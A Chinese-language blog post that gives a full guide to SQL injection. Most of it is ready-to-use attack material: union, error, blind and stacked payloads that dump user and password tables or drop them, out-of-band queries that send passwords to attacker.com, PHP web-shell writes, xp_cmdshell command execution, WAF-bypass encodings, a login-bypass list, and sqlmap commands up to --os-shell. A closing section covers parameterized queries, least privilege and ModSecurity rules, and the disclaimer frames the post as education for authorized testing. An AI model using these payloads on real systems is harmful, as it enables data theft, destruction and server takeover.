---
layout: post
title: "SQL注入漏洞完全指南：原理、技巧与防御"
date: 2026-03-14 10:00:00 +0800
categories: [网络安全, Web安全]
tags: [SQL注入, SQLi, 漏洞分析, 安全防御, 渗透测试, Web安全]
author: Security Researcher
---

> **免责声明**：本文仅供学习交流使用，请勿用于非法用途。进行安全测试时，请确保已获得目标系统的合法授权。

## 目录
- [什么是SQL注入](#什么是sql注入)
- [SQL注入原理](#sql注入原理)
- [SQL注入类型](#sql注入类型)
- [各数据库注入技巧](#各数据库注入技巧)
- [Payload大全](#payload大全)
- [绕过技巧](#绕过技巧)
- [SQLMap工具使用](#sqlmap工具使用)
- [防御措施](#防御措施)
- [总结](#总结)

---

## 什么是SQL注入

**SQL注入（SQL Injection，简称SQLi）** 是一种常见的Web安全漏洞，攻击者通过在应用程序的输入字段中插入恶意的SQL代码，从而操纵后端数据库执行非预期的操作。这种漏洞允许攻击者绕过身份验证、读取敏感数据、修改数据库内容，甚至在某些情况下执行系统命令。

### SQL注入的危害

| 危害类型 | 具体表现 |
|---------|---------|
| 数据泄露 | 读取用户账号、密码、个人信息等敏感数据 |
| 数据篡改 | 修改、删除数据库中的数据 |
| 权限提升 | 获取数据库管理员权限 |
| 系统入侵 | 通过数据库执行系统命令，控制服务器 |
| 绕过认证 | 无需密码即可登录系统 |

### 常见注入点

SQL注入可能出现在任何与数据库交互的用户输入位置：

1. **URL参数**：`?id=1` 或 `?user=admin`
2. **表单输入**：登录框、搜索框、评论框等
3. **HTTP头**：User-Agent、Referer、Cookie等
4. **文件上传**：文件名、文件内容解析
5. **API接口**：RESTful API的参数传递

---

## SQL注入原理

### 漏洞产生原因

SQL注入漏洞产生的根本原因是**应用程序对用户输入的数据没有进行充分的验证和过滤**，直接将用户输入拼接到SQL查询语句中执行。

#### 漏洞代码示例

**PHP示例（存在漏洞）：**

```php
<?php
$id = $_GET['id'];
// 危险：直接拼接用户输入
$sql = "SELECT * FROM users WHERE id = $id";
$result = mysqli_query($conn, $sql);
?>
```

**Java示例（存在漏洞）：**

```java
String id = request.getParameter("id");
// 危险：直接拼接用户输入
String sql = "SELECT * FROM users WHERE id = " + id;
Statement stmt = conn.createStatement();
ResultSet rs = stmt.executeQuery(sql);
```

#### 攻击示例

正常请求：
```
http://example.com/user.php?id=1
```

生成的SQL：
```sql
SELECT * FROM users WHERE id = 1
```

恶意请求：
```
http://example.com/user.php?id=1 OR 1=1
```

生成的SQL：
```sql
SELECT * FROM users WHERE id = 1 OR 1=1
```

由于 `1=1` 永远为真，这条SQL将返回 `users` 表中的所有记录。

### SQL注入流程

```
寻找注入点 → 判断注入类型 → 获取数据库信息 → 获取表名 → 获取列名 → 获取数据
```

---

## SQL注入类型

### 1. 基于错误的注入（Error-based）

当应用程序的数据库错误信息直接显示在页面上时，攻击者可以通过构造特殊的SQL语句，利用数据库报错信息获取敏感数据。

#### 利用方式

**MySQL报错注入示例：**

```sql
-- 使用 extractvalue() 函数
?id=1' AND extractvalue(1, concat(0x7e, (SELECT version()), 0x7e))-- -

-- 使用 updatexml() 函数
?id=1' AND updatexml(1, concat(0x7e, (SELECT database()), 0x7e), 1)-- -

-- 使用 floor() 函数
?id=1' AND (SELECT 1 FROM (SELECT COUNT(*), CONCAT((SELECT version()), FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)-- -
```

**SQL Server报错注入：**

```sql
-- 使用 convert() 函数
?id=1' AND 1=convert(int, (SELECT @@version))--

-- 使用 cast() 函数
?id=1' AND 1=cast((SELECT DB_NAME()) as int)--
```

### 2. 联合查询注入（Union-based）

UNION操作符用于合并两个或多个SELECT语句的结果集。攻击者可以利用UNION将恶意查询的结果与原查询结果合并返回。

#### 利用步骤

**步骤1：判断列数**

```sql
?id=1' ORDER BY 1-- -
?id=1' ORDER BY 2-- -
?id=1' ORDER BY 3-- -
-- 直到报错，确定列数
```

或使用UNION SELECT：

```sql
?id=1' UNION SELECT NULL-- -
?id=1' UNION SELECT NULL,NULL-- -
?id=1' UNION SELECT NULL,NULL,NULL-- -
```

**步骤2：判断显示位**

```sql
?id=1' UNION SELECT 1,2,3-- -
```

**步骤3：获取数据**

```sql
-- 获取数据库版本和当前数据库名
?id=1' UNION SELECT 1,version(),database()-- -

-- 获取所有数据库名
?id=1' UNION SELECT 1,2,group_concat(schema_name) FROM information_schema.schemata-- -

-- 获取当前数据库的所有表名
?id=1' UNION SELECT 1,2,group_concat(table_name) FROM information_schema.tables WHERE table_schema=database()-- -

-- 获取指定表的列名
?id=1' UNION SELECT 1,2,group_concat(column_name) FROM information_schema.columns WHERE table_name='users'-- -

-- 获取数据
?id=1' UNION SELECT 1,group_concat(username),group_concat(password) FROM users-- -
```

### 3. 布尔盲注（Boolean-based Blind）

当应用程序不返回具体的数据库错误信息，但页面会根据查询结果的真假显示不同内容时，可以使用布尔盲注。

#### 判断方法

```sql
-- 真条件，页面正常显示
?id=1' AND 1=1-- -

-- 假条件，页面显示异常或空白
?id=1' AND 1=2-- -
```

#### 数据获取方法

**使用 SUBSTRING() 逐字符判断：**

```sql
-- 判断数据库名第一个字符是否为 'm'
?id=1' AND SUBSTRING(database(), 1, 1) = 'm'-- -

-- 使用 ASCII() 函数判断
?id=1' AND ASCII(SUBSTRING(database(), 1, 1)) = 109-- -
```

**使用 LIKE 模糊匹配：**

```sql
-- 判断数据库名是否以 'm' 开头
?id=1' AND database() LIKE 'm%'-- -

-- 判断数据库名是否为 'mysql'
?id=1' AND database() LIKE 'mysql'-- -
```

### 4. 时间盲注（Time-based Blind）

当页面无论查询真假都返回相同内容时，可以使用时间盲注，通过观察响应时间来判断条件是否成立。

#### MySQL时间盲注

```sql
-- 使用 SLEEP() 函数
?id=1' AND IF(ASCII(SUBSTRING(database(),1,1))=109, SLEEP(5), 0)-- -

-- 使用 BENCHMARK() 函数
?id=1' AND IF(ASCII(SUBSTRING(database(),1,1))=109, BENCHMARK(10000000,MD5(1)), 0)-- -
```

#### SQL Server时间盲注

```sql
-- 使用 WAITFOR DELAY
?id=1'; IF (ASCII(SUBSTRING((SELECT DB_NAME()),1,1)) = 109) WAITFOR DELAY '0:0:5'--
```

#### PostgreSQL时间盲注

```sql
-- 使用 pg_sleep()
?id=1' AND (SELECT CASE WHEN (ASCII(SUBSTRING((SELECT current_database()),1,1))=109) THEN pg_sleep(5) ELSE pg_sleep(0) END)-- -
```

### 5. 堆叠查询注入（Stacked Queries）

某些数据库支持在一次请求中执行多条SQL语句，使用分号 `;` 分隔。这允许攻击者在原有查询后追加任意SQL语句。

#### 利用条件

- 数据库支持堆叠查询（MySQL、SQL Server、PostgreSQL支持，Oracle不支持）
- 应用程序的数据库连接参数允许多语句执行

#### 攻击示例

```sql
-- 添加管理员账号
?id=1'; INSERT INTO users (username, password) VALUES ('hacker', 'password123')-- -

-- 修改管理员密码
?id=1'; UPDATE users SET password='hacked' WHERE username='admin'-- -

-- 删除数据
?id=1'; DROP TABLE users-- -
```

### 6. 带外注入（Out-of-Band）

当无法直接从页面获取数据时，可以通过DNS查询或HTTP请求将数据发送到外部服务器。

#### DNS带外（MySQL）

```sql
-- 需要secure_file_priv允许
?id=1' AND LOAD_FILE(CONCAT('\\\\', (SELECT password FROM users LIMIT 1), '.attacker.com\\a.txt'))-- -
```

#### HTTP带外（SQL Server）

```sql
?id=1'; DECLARE @T VARCHAR(1024); SET @T=(SELECT password FROM users WHERE username='admin'); EXEC master..xp_dirtree "\\"+@T+".attacker.com\a.txt"--
```

---

## 各数据库注入技巧

### MySQL注入

#### 常用函数

| 函数 | 作用 |
|-----|------|
| `version()` | 数据库版本 |
| `database()` | 当前数据库名 |
| `user()` | 当前用户名 |
| `@@datadir` | 数据目录 |
| `@@version_compile_os` | 操作系统 |
| `group_concat()` | 多行合并 |
| `concat()` | 字符串连接 |
| `substring()` / `substr()` / `mid()` | 字符串截取 |
| `ascii()` / `ord()` | 转ASCII码 |
| `sleep()` | 延时 |
| `benchmark()` | 性能测试（可用于延时） |

#### 获取数据库结构

```sql
-- 所有数据库
SELECT group_concat(schema_name) FROM information_schema.schemata

-- 当前数据库的所有表
SELECT group_concat(table_name) FROM information_schema.tables WHERE table_schema=database()

-- 指定表的所有列
SELECT group_concat(column_name) FROM information_schema.columns WHERE table_name='users'

-- MySQL 5.0以下版本（无information_schema）
-- 需要猜测表名和列名
```

#### 读写文件

```sql
-- 读文件（需要FILE权限）
SELECT LOAD_FILE('/etc/passwd')
SELECT LOAD_FILE('C:\\Windows\\win.ini')

-- 写文件（需要FILE权限）
SELECT '<?php @eval($_POST[1]);?>' INTO OUTFILE '/var/www/html/shell.php'
SELECT '<?php @eval($_POST[1]);?>' INTO DUMPFILE '/var/www/html/shell.php'
```

### SQL Server注入

#### 常用函数和变量

| 函数/变量 | 作用 |
|----------|------|
| `@@version` | 数据库版本 |
| `DB_NAME()` | 当前数据库名 |
| `SYSTEM_USER` | 系统用户名 |
| `CURRENT_USER` | 当前用户名 |
| `HOST_NAME()` | 主机名 |
| `@@SERVERNAME` | 服务器名 |

#### 获取数据库结构

```sql
-- 所有数据库
SELECT name FROM master..sysdatabases

-- 当前数据库的所有表
SELECT name FROM sysobjects WHERE xtype='U'

-- 指定表的所有列
SELECT name FROM syscolumns WHERE id=(SELECT id FROM sysobjects WHERE name='users')
```

#### 执行系统命令

```sql
-- 开启xp_cmdshell
EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;

-- 执行命令
EXEC master..xp_cmdshell 'whoami'
EXEC master..xp_cmdshell 'net user'
```

### PostgreSQL注入

#### 常用函数

| 函数 | 作用 |
|-----|------|
| `version()` | 数据库版本 |
| `current_database()` | 当前数据库名 |
| `current_user` | 当前用户名 |
| `session_user` | 会话用户 |
| `pg_read_file()` | 读文件 |

#### 获取数据库结构

```sql
-- 所有数据库
SELECT datname FROM pg_database

-- 当前数据库的所有表
SELECT tablename FROM pg_tables WHERE schemaname='public'

-- 指定表的所有列
SELECT column_name FROM information_schema.columns WHERE table_name='users'
```

#### 读写文件

```sql
-- 读文件
SELECT pg_read_file('postgresql.conf', 0, 1000)

-- 写文件（需要超级用户权限）
COPY (SELECT '<?php @eval($_POST[1]);?>') TO '/var/www/html/shell.php'
```

### Oracle注入

#### 常用函数

| 函数 | 作用 |
|-----|------|
| `SELECT * FROM v$version` | 数据库版本 |
| `SELECT SYS.DATABASE_NAME FROM DUAL` | 数据库名 |
| `SELECT USER FROM DUAL` | 当前用户 |
| `SELECT instance_name FROM v$instance` | 实例名 |

#### 获取数据库结构

```sql
-- 所有表（当前用户）
SELECT table_name FROM user_tables

-- 所有表（所有用户）
SELECT table_name FROM all_tables

-- 指定表的所有列
SELECT column_name FROM user_tab_columns WHERE table_name='USERS'
```

#### 特殊技巧

```sql
-- 使用 DUAL 表
SELECT 1 FROM DUAL

-- 字符串连接使用 ||
SELECT 'a' || 'b' FROM DUAL

-- 使用 CHR() 函数
SELECT CHR(65) FROM DUAL  -- 返回 'A'
```

---

## Payload大全

### 通用Payload

#### 判断注入点

```sql
-- 单引号测试
'

-- 双引号测试
"

-- 单引号+括号
')

-- 双引号+括号
")

-- 单引号+双括号
'))
```

#### 注释符号

```sql
-- MySQL
-- 
# 
/* */
/*! 代码 */  -- MySQL特有，内联注释

-- SQL Server
-- 
/* */

-- Oracle
-- 
/* */

-- PostgreSQL
-- 
/* */
```

### 常见绕过Payload

#### 空格绕过

```sql
-- 使用注释代替空格
SELECT/**/1,2,3

-- 使用括号
SELECT(1),(2),(3)

-- 使用换行符（URL编码）
SELECT%0A1,2,3

-- 使用Tab
SELECT%091,2,3
```

#### 逗号绕过

```sql
-- 使用 JOIN
SELECT * FROM (SELECT 1)a JOIN (SELECT 2)b JOIN (SELECT 3)c

-- 使用 OFFSET
SELECT 1 LIMIT 1 OFFSET 1
```

#### 单引号绕过

```sql
-- 使用十六进制
SELECT 0x61646d696e  -- 'admin'的十六进制

-- 使用 CHAR() / CHR()
SELECT CHAR(97,100,109,105,110)  -- MySQL
SELECT CHR(97)||CHR(100)||CHR(109)||CHR(105)||CHR(110)  -- Oracle
```

### 万能密码Payload

```sql
-- 登录绕过
' OR '1'='1'--
' OR '1'='1'/*
' OR 1=1--
' OR 1=1#
' OR 1=1/*
') OR '1'='1'--
') OR ('1'='1'--

-- 基于注释的绕过
' OR 1=1-- -
' OR 1=1#
' OR 1=1//
```

---

## 绕过技巧

### 1. WAF绕过

#### 大小写混淆

```sql
-- 原始
UNION SELECT

-- 绕过
UnIoN SeLeCt
uNiOn sElEcT
```

#### 关键字替换

```sql
-- 使用注释分割
UN/**/ION/**/SELECT
UN%0aION%0aSELECT

-- 使用内联注释（MySQL）
/*!50000UNION*/ /*!50000SELECT*/
```

#### 等价函数替换

```sql
-- 原始
SELECT SUBSTRING(password,1,1) FROM users

-- 替换
SELECT SUBSTR(password,1,1) FROM users
SELECT MID(password,1,1) FROM users
```

#### 编码绕过

```sql
-- URL编码
%55%4E%49%4F%4E  -- UNION

-- 双重URL编码
%2555%254E%2549%254F%254E

-- Unicode编码
%u0055%u004E%u0049%u004F%u004E
```

### 2. 过滤绕过

#### AND/OR过滤

```sql
-- 使用 && 和 ||（MySQL）
?id=1 && 1=1
?id=1 || 1=1

-- 使用 LIKE
?id=1' LIKE 1=1--

-- 使用 REGEXP
?id=1' REGEXP 1=1--
```

#### SELECT过滤

```sql
-- 使用子查询
?id=1' UNION ALL (SELECT * FROM (SELECT 1)a JOIN (SELECT 2)b)--

-- 使用括号
?id=1' UNION (SELECT 1,2,3)--
```

### 3. 特殊技巧

#### 二次编码

```sql
-- 对%进行编码
%2527  -- 解码为 %27，再解码为 '
```

#### HTTP参数污染

```sql
-- 发送多个同名参数
?id=1&id=2' OR '1'='1
-- 某些WAF只检查第一个参数，后端使用第二个参数
```

#### 分块传输绕过

使用HTTP分块传输编码，将Payload分块发送，绕过基于请求体的检测。

---

## SQLMap工具使用

### SQLMap简介

SQLMap是一款开源的自动化SQL注入工具，支持多种数据库，能够自动检测和利用SQL注入漏洞。

### 基本命令

#### 检测注入点

```bash
# 基本检测
sqlmap -u "http://example.com/page.php?id=1"

# 指定参数
sqlmap -u "http://example.com/page.php?id=1&cat=2" -p id

# POST请求
sqlmap -u "http://example.com/login.php" --data="username=admin&password=123"

# 带Cookie
sqlmap -u "http://example.com/page.php?id=1" --cookie="PHPSESSID=abc123"
```

#### 获取数据库信息

```bash
# 获取所有数据库
sqlmap -u "http://example.com/page.php?id=1" --dbs

# 获取当前数据库
sqlmap -u "http://example.com/page.php?id=1" --current-db

# 获取当前用户
sqlmap -u "http://example.com/page.php?id=1" --current-user

# 获取所有用户
sqlmap -u "http://example.com/page.php?id=1" --users

# 获取密码（哈希）
sqlmap -u "http://example.com/page.php?id=1" --passwords
```

#### 获取表和数据

```bash
# 获取指定数据库的所有表
sqlmap -u "http://example.com/page.php?id=1" -D database_name --tables

# 获取指定表的所有列
sqlmap -u "http://example.com/page.php?id=1" -D database_name -T table_name --columns

# 获取数据
sqlmap -u "http://example.com/page.php?id=1" -D database_name -T table_name -C column1,column2 --dump

# 获取所有数据
sqlmap -u "http://example.com/page.php?id=1" -D database_name --dump-all
```

#### 高级选项

```bash
# 指定数据库类型
sqlmap -u "http://example.com/page.php?id=1" --dbms=mysql

# 指定注入技术
sqlmap -u "http://example.com/page.php?id=1" --technique=U  # Union
sqlmap -u "http://example.com/page.php?id=1" --technique=B  # Boolean
sqlmap -u "http://example.com/page.php?id=1" --technique=T  # Time
sqlmap -u "http://example.com/page.php?id=1" --technique=E  # Error
sqlmap -u "http://example.com/page.php?id=1" --technique=S  # Stacked

# 使用代理
sqlmap -u "http://example.com/page.php?id=1" --proxy="http://127.0.0.1:8080"

# 设置线程数
sqlmap -u "http://example.com/page.php?id=1" --threads=10

# 设置等级和风险
sqlmap -u "http://example.com/page.php?id=1" --level=5 --risk=3

# 读取文件
sqlmap -u "http://example.com/page.php?id=1" --file-read="/etc/passwd"

# 写入文件
sqlmap -u "http://example.com/page.php?id=1" --file-write="shell.php" --file-dest="/var/www/html/shell.php"

# 执行命令（需要权限）
sqlmap -u "http://example.com/page.php?id=1" --os-cmd="whoami"
sqlmap -u "http://example.com/page.php?id=1" --os-shell
```

### SQLMap Tamper脚本

Tamper脚本用于绕过WAF和过滤：

```bash
# 使用tamper脚本
sqlmap -u "http://example.com/page.php?id=1" --tamper=space2comment

# 多个tamper脚本
sqlmap -u "http://example.com/page.php?id=1" --tamper=space2comment,charencode

# 常用tamper脚本
sqlmap -u "http://example.com/page.php?id=1" --tamper=base64encode
sqlmap -u "http://example.com/page.php?id=1" --tamper=charencode
sqlmap -u "http://example.com/page.php?id=1" --tamper=equaltolike
sqlmap -u "http://example.com/page.php?id=1" --tamper=space2hash
sqlmap -u "http://example.com/page.php?id=1" --tamper=space2morehash
sqlmap -u "http://example.com/page.php?id=1" --tamper=space2mssqlblank
sqlmap -u "http://example.com/page.php?id=1" --tamper=space2plus
sqlmap -u "http://example.com/page.php?id=1" --tamper=space2randomblank
sqlmap -u "http://example.com/page.php?id=1" --tamper=unionalltounion
sqlmap -u "http://example.com/page.php?id=1" --tamper=unmagicquotes
```

---

## 防御措施

### 1. 参数化查询（Prepared Statements）

参数化查询是防御SQL注入最有效的方法，将SQL代码和数据分离。

#### PHP（PDO）

```php
<?php
// 使用PDO预处理语句
$pdo = new PDO('mysql:host=localhost;dbname=test', 'user', 'password');

// 准备语句
$stmt = $pdo->prepare('SELECT * FROM users WHERE id = :id');

// 绑定参数并执行
$stmt->execute(['id' => $_GET['id']]);

// 获取结果
$user = $stmt->fetch();
?>
```

#### PHP（MySQLi）

```php
<?php
$mysqli = new mysqli('localhost', 'user', 'password', 'test');

// 准备语句
$stmt = $mysqli->prepare('SELECT * FROM users WHERE id = ?');

// 绑定参数
$stmt->bind_param('i', $_GET['id']);

// 执行
$stmt->execute();

// 获取结果
$result = $stmt->get_result();
$user = $result->fetch_assoc();
?>
```

#### Java（JDBC）

```java
// 使用PreparedStatement
String sql = "SELECT * FROM users WHERE id = ?";
PreparedStatement pstmt = conn.prepareStatement(sql);
pstmt.setInt(1, Integer.parseInt(request.getParameter("id")));
ResultSet rs = pstmt.executeQuery();
```

#### Python（psycopg2）

```python
import psycopg2

conn = psycopg2.connect(database="test", user="user", password="password")
cur = conn.cursor()

# 使用参数化查询
cur.execute("SELECT * FROM users WHERE id = %s", (user_id,))
results = cur.fetchall()
```

### 2. 输入验证和过滤

#### 白名单验证

```php
<?php
// 只允许数字
$id = $_GET['id'];
if (!ctype_digit($id)) {
    die('Invalid ID');
}

// 或使用正则表达式
if (!preg_match('/^\d+$/', $id)) {
    die('Invalid ID');
}
?>
```

#### 转义特殊字符

```php
<?php
// 使用mysqli_real_escape_string（不推荐作为唯一防御手段）
$username = mysqli_real_escape_string($conn, $_POST['username']);
$password = mysqli_real_escape_string($conn, $_POST['password']);
?>
```

### 3. 最小权限原则

```sql
-- 创建只读用户
CREATE USER 'web_read'@'localhost' IDENTIFIED BY 'password';
GRANT SELECT ON database.* TO 'web_read'@'localhost';

-- 创建读写用户（限制表）
CREATE USER 'web_write'@'localhost' IDENTIFIED BY 'password';
GRANT SELECT, INSERT, UPDATE ON database.users TO 'web_write'@'localhost';

-- 禁止危险权限
REVOKE FILE ON *.* FROM 'web_user'@'localhost';
REVOKE PROCESS ON *.* FROM 'web_user'@'localhost';
REVOKE SUPER ON *.* FROM 'web_user'@'localhost';
```

### 4. WAF防护

#### ModSecurity规则示例

```apache
# 检测SQL注入关键字
SecRule ARGS "@rx (union|select|insert|update|delete|drop|create|alter|exec|script)" \
    "id:1001,phase:2,deny,status:403,msg:'SQL Injection Detected'"

# 检测SQL注释
SecRule ARGS "@rx (\/\*|\*\/|--|#)" \
    "id:1002,phase:2,deny,status:403,msg:'SQL Comment Detected'"

# 检测单引号
SecRule ARGS "@rx '%27" \
    "id:1003,phase:2,deny,status:403,msg:'Quote Detected'"
```

### 5. 其他安全措施

#### 错误信息处理

```php
<?php
// 生产环境不显示详细错误
try {
    $pdo = new PDO('mysql:host=localhost;dbname=test', 'user', 'password');
} catch (PDOException $e) {
    // 记录详细错误到日志
    error_log($e->getMessage());
    // 向用户显示通用错误
    die('Database connection failed');
}
?>
```

#### 数据库配置安全

```ini
# MySQL安全配置
[mysqld]
# 禁用LOAD_FILE和INTO OUTFILE
local_infile = 0
secure_file_priv = /tmp

# 禁止网络访问（如果不需要）
skip-networking

# 设置连接限制
max_connections = 100
```

---

## 总结

SQL注入是一种历史悠久但仍然广泛存在的Web安全漏洞。防御SQL注入需要从多个层面入手：

### 防御要点

1. **使用参数化查询**：这是最有效的防御手段，将SQL代码和数据严格分离
2. **输入验证**：对所有用户输入进行白名单验证
3. **最小权限**：数据库账号只赋予必要的权限
4. **错误处理**：不向用户暴露详细的数据库错误信息
5. **WAF防护**：部署Web应用防火墙作为额外防护层

### 安全开发建议

**对于开发者**：
- 始终使用参数化查询，永远不要直接拼接SQL
- 对所有用户输入进行验证和过滤
- 定期进行安全审计和代码审查
- 及时更新数据库和应用程序

**对于安全研究人员**：
- 在进行渗透测试前确保获得合法授权
- 使用隔离的测试环境进行漏洞研究
- 负责任地披露漏洞，帮助厂商修复
- 遵守相关法律法规和道德准则

### 学习资源

- [OWASP SQL Injection](https://owasp.org/www-community/attacks/SQL_Injection)
- [PortSwigger SQL Injection](https://portswigger.net/web-security/sql-injection)
- [SQLMap官方文档](https://sqlmap.org/)
- [狼组安全团队 - SQL注入知识库](https://wiki.wgpsec.org/knowledge/ctf/sql.html)

---

## 参考资源

- [OWASP SQL Injection Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html)
- [PortSwigger Web Security Academy - SQL Injection](https://portswigger.net/web-security/sql-injection)
- [SQLMap官方文档](https://github.com/sqlmapproject/sqlmap/wiki)
- [狼组安全团队 - SQL注入知识库](https://wiki.wgpsec.org/knowledge/ctf/sql.html)
- [PayloadsAllTheThings - SQL Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection)
- [SQL Injection Knowledge Base](https://websec.ca/kb/sql_injection)
- [MySQL官方文档](https://dev.mysql.com/doc/)
- [Microsoft SQL Server文档](https://docs.microsoft.com/en-us/sql/)
- [PostgreSQL官方文档](https://www.postgresql.org/docs/)
- [Oracle官方文档](https://docs.oracle.com/en/database/)

---

*本文仅供学习交流使用，请勿用于非法用途。进行安全测试时，请确保已获得目标系统的合法授权。*

*本文最后更新于：2026年3月14日*
